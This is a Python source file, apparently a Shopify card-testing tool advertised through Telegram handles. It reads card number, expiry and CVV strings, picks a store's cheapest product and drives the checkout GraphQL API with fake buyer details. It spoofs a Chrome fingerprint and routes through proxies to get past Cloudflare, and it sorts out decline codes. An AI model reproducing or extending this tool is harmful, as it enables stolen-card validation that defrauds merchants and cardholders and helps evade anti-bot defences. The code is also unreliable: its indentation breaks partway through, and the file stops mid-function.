import asyncio
import json
import re
import random
import argparse
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time
from curl_cffi import requests as curl_requests

# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/DEADLINEHERE5 
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/PUNISHERHELPDESK
# 𝐃𝐞𝐯: @DEADLINEHERE5


async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True, proxy=None
):
    original_variables = json_data.get('variables', {}).copy()
    
    for attempt in range(max_retries + 1):
        try:
            # Using curl_cffi for better Cloudflare bypass
            response = curl_requests.post(
                graphql_url, 
                params=params, 
                headers=headers, 
                json=json_data, 
                impersonate="chrome110", # Impersonate a Chrome browser
                timeout=30 # Add a timeout
            )
            response_text = response.text
            
            # Check for Cloudflare challenge (e.g., CAPTCHA, JS challenge)
            if "cf_chl_opt" in response_text or "just a moment" in response_text.lower():
                print(f"Cloudflare challenge detected on attempt {attempt + 1}. Trying again...")
                # In a real-world scenario, you'd integrate with a CAPTCHA solving service here.
                # For now, we'll just retry or indicate CAPTCHA is required.
                if solve_captcha:
                    # Placeholder for CAPTCHA solving logic
                    # For example: captcha_solution = await solve_captcha_service(response_text)
                    # Then re-submit the request with the captcha solution
                    pass
                
                if attempt < max_retries: # If not the last attempt, retry
                    await asyncio.sleep(5) # Wait a bit before retrying
                    continue
                else:
                    return None, "Cloudflare challenge detected and not solved", True # Indicate CAPTCHA required

            return response, response_text, False
            
        except Exception as e:
            print(f"Request failed on attempt {attempt + 1}: {e}")
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1) # Wait a bit before retrying
    
    return None, "Max retries reached without successful response", False


def is_captcha_required(response_text):
    if not response_text:
        return False
    
    # Check for common CAPTCHA indicators in Shopify/Cloudflare responses
    indicators = [
        "captcha",
        "cf_chl_opt",
        "just a moment",
        "checking your browser",
        "please verify you are a human",
        "recaptcha",
        "hcaptcha"
    ]
    
    response_lower = response_text.lower()
    for indicator in indicators:
        if indicator in response_lower:
            return True
            
    return False


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    # Check for common specific errors first
    if "Invalid JSON response" in message:
        return "INVALID_JSON_RESPONSE"
    if "CAPTCHA_REQUIRED" in message:
        return "CAPTCHA_REQUIRED"
    if "Cloudflare challenge" in message:
        return "CLOUDFLARE_CHALLENGE"
    if "Card declined" in message.lower() or "declined" in message.lower():
        return "CARD_DECLINED"
        
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]



QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId components{...MerchandiseLineComponentWithCapabilities __typename}merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}"""
QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        try:
            resp = curl_requests.get(
                f"{domain}/products.json", 
                impersonate="chrome110", 
                timeout=30, 
                proxies={"http": proxy, "https": proxy} if proxy else None
            )
            resp.raise_for_status() # Raise an exception for HTTP errors
            text = resp.text
            if "shopify" not in text.lower():
                return False, "<b>Not Shopify!</b>"

            result = resp.json()["products"]
            if not result:
                return False, "<b>No Products!</b>"

        except curl_requests.errors.RequestsError as e:
            return False, f"<b>Site Error or Proxy Error: {str(e)}</b>"
        except Exception as e:
            return False, f"<b>Error fetching products: {str(e)}</b>"

        min_price = float("inf")
        min_product = None

        for product in result:
            if not product.get("variants"):
                continue
            
            for variant in product["variants"]:
                if not variant.get("available", True):
                    continue
                
                try:
                    price = variant.get("price", "0")
                    if isinstance(price, str):
                        price = float(price.replace(",", ""))
                    else:
                        price = float(price)

                    if price < min_price:
                        min_price = price
                        min_product = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product["handle"]}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get("variant_id"):
            return min_product
        else:
            return False, "<b>No Valid Products</b>"

    except Exception as e:
        return False, f"error: {str(e)}"


def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Expected CC|MM|YYYY|CVV")
    return {
        "cc": parts[0].strip(),
        "mes": parts[1].strip(),
        "ano": parts[2].strip(),
        "cvv": parts[3].strip()
    }

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    try:
        if not site_url.startswith("http"):
            site_url = "https://" + site_url

        parsed_url = urlparse(site_url)
        domain = parsed_url.netloc
        
        proxy = parse_proxy(proxy_str) if proxy_str else None

        # No aiohttp session needed as curl_cffi handles requests directly
        # The 'session' parameter in make_graphql_request_with_captcha_handling is not used for actual requests anymore.
        # It's kept for compatibility with the function signature.
        session = None # Placeholder, not actually used for requests
        
        if variant_id:
            merch = variant_id
            product_link = site_url
        else:
            success, product_data = await fetch_products(domain, proxy_str)
            if not success:
                return False, product_data, "UNKNOWN", "0.0", "USD"
            merch = product_data["variant_id"]
            product_link = product_data["link"]
        
        # Step 1: Get initial checkout data
        checkout_url = f"https://{domain}/cart/{merch}:1"
        
        try:
            resp = curl_requests.get(
                checkout_url, 
                impersonate="chrome110", 
                timeout=30, 
                allow_redirects=False,
                proxies={"http": proxy, "https": proxy} if proxy else None
            )
            if resp.status_code == 302:
                checkout_url = resp.headers["Location"]
            else:
                return False, f"Failed to get checkout URL: {resp.status_code}", "UNKNOWN", "0.0", "USD"
        except Exception as e:
            return False, f"Error getting checkout URL: {str(e)}", "UNKNOWN", "0.0", "USD"

        # Extract checkout token and URL
        match = re.search(r"\/checkouts\/([a-f0-9]{32})", checkout_url)
        if not match:
            return False, "Could not extract checkout token", "UNKNOWN", "0.0", "USD"
        checkout_token = match.group(1)
        
        # Step 2: Get initial page content and session token
        try:
            resp = curl_requests.get(
                checkout_url, 
                impersonate="chrome110", 
                timeout=30, 
                proxies={"http": proxy, "https": proxy} if proxy else None
            )
            resp.raise_for_status()
            page_content = resp.text
        except Exception as e:
            return False, f"Error getting page content: {str(e)}", "UNKNOWN", "0.0", "USD"
            
        sst_match = re.search(r"\"sessionToken\":\"([a-zA-Z0-9_-]+)\",", page_content)
        if not sst_match:
            return False, "Session token not found", "UNKNOWN", "0.0", "USD"
        sst = sst_match.group(1)
        
        ident_sig_match = re.search(r"\"shopify-identification-signature\":\"([a-zA-Z0-9_-]+)\",", page_content)
        ident_sig = ident_sig_match.group(1) if ident_sig_match else None

            # Extract other necessary data from page_content (example placeholders)
            # These would typically be parsed from hidden input fields or JS variables
            # For simplicity, using dummy values or assuming they are passed as arguments
            firstName = "John"
            lastName = "Doe"
            email = "john.doe@example.com"
            phone = "5551234567"
            street = "123 Main St"
            address2 = "Apt 101"
            city = "Anytown"
            country_code = "US"
            s_zip = "12345"
            state = "CA"
            
            # Step 3: GraphQL Proposal Request (Shipping)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": f"https://{domain}",
                "Referer": checkout_url,
                "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-shopify-checkout-version": "2023-10",
                "x-shopify-web-session-token": sst
            }

            params = {
                "operationName": "Proposal"
            }

            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "buyerIdentity": {
                        "email": email,
                        "phone": phone,
                        "deliveryAddress": {
                            "streetAddress": {
                                "address1": street,
                                "address2": address2,
                                "city": city,
                                "countryCode": country_code,
                                "postalCode": s_zip,
                                "firstName": firstName,
                                "lastName": lastName,
                                "zoneCode": state,
                                "phone": phone
                            }
                        }
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{merch}"
                                }
                            },
                            "quantity": {"items": {"value": 1}}
                        }]
                    },
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": street,
                                    "address2": address2,
                                    "city": city,
                                    "countryCode": country_code,
                                    "postalCode": s_zip,
                                    "firstName": firstName,
                                    "lastName": lastName,
                                    "zoneCode": state,
                                    "phone": phone
                                }
                            },
                            "deliveryMethodTypes": ["SHIPPING"],
                            "targetMerchandiseLines": {
                                "lines": [{
                                    "stableId": "1"
                                }]
                            }
                        }]
                    },
                    "payment": {
                        "billingAddress": {
                            "streetAddress": {
                                "address1": street,
                                "address2": address2,
                                "city": city,
                                "countryCode": country_code,
                                "postalCode": s_zip,
                                "firstName": firstName,
                                "lastName": lastName,
                                "zoneCode": state,
                                "phone": phone
                            }
                        }
                    },
                    "taxes": {
                        "proposedTotalAmount": {
                            "value": {"amount": "0.0", "currencyCode": "USD"}
                        }
                    },
                    "localizationExtension": {
                        "languageCode": "en",
                        "countryCode": country_code
                    }
                },
                "operationName": "Proposal"
            }

            graphql_url = f"https://{urlparse(checkout_url).netloc}/checkouts/unstable/graphql"
            
            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=3, proxy=proxy
            )
            
            if captcha_solved:
                return False, "CAPTCHA_REQUIRED", "UNKNOWN", "0.0", "USD"

            if not response:
                return False, f"Request failed: {resp_text}", "UNKNOWN", "0.0", "USD"
            
            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", "UNKNOWN", "0.0", "USD"

            if "errors" in resp_json:
                errors = resp_json.get("errors", [])
                error_msgs = [e.get("message", str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", "UNKNOWN", "0.0", "USD"

            try:
                if "data" not in resp_json:
                    return False, "No data in proposal response", "UNKNOWN", "0.0", "USD"
                
                session_data = resp_json["data"].get("session")
                if session_data is None:
                    return False, "Session is null", "UNKNOWN", "0.0", "USD"
                
                negotiate = session_data.get("negotiate")
                if negotiate is None:
                    return False, "Negotiate returned null", "UNKNOWN", "0.0", "USD"
                
                result = negotiate.get("result")
                if result is None:
                    return False, "Result is null", "UNKNOWN", "0.0", "USD"
                
                result_type = result.get("__typename", "Unknown")
                
                if result_type == "CheckpointDenied":
                    return False, f"Checkpoint Denied", "UNKNOWN", "0.0", "USD"
                
                if result_type == "Throttled":
                    return False, "Throttled", "UNKNOWN", "0.0", "USD"
                
                if result_type == "NegotiationResultFailed":
                    return False, "Negotiation failed", "UNKNOWN", "0.0", "USD"
                
                checkpoint_data = result.get("checkpointData")
                queueToken = result.get("queueToken") # Get queueToken here
                
                seller_proposal = result.get("sellerProposal")
                if seller_proposal is None:
                    return False, "Seller proposal is null", "UNKNOWN", "0.0", "USD"
                
                delivery_data = seller_proposal.get("delivery")
                running_total_data = seller_proposal.get("runningTotal")
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", "UNKNOWN", "0.0", "USD"
                
                running_total = running_total_data["value"]["amount"]
                currency = running_total_data["value"]["currencyCode"]
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", "UNKNOWN", "0.0", "USD"

            if not delivery_data:
                return False, "No delivery data in proposal", "UNKNOWN", "0.0", "USD"
            
            delivery_type = delivery_data.get("__typename", "")
            
            delivery_strategy = ""
            shipping_amount = 0.0

            if delivery_type == "FilledDeliveryTerms":
                delivery_lines = delivery_data.get("deliveryLines", [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get("availableDeliveryStrategies", [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get("handle", "")
                        shipping_amount_data = available_strategies[0].get("amount", {}).get("value", {}).get("amount", "0")
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0

            try:
                tax_data = seller_proposal.get("tax", {})
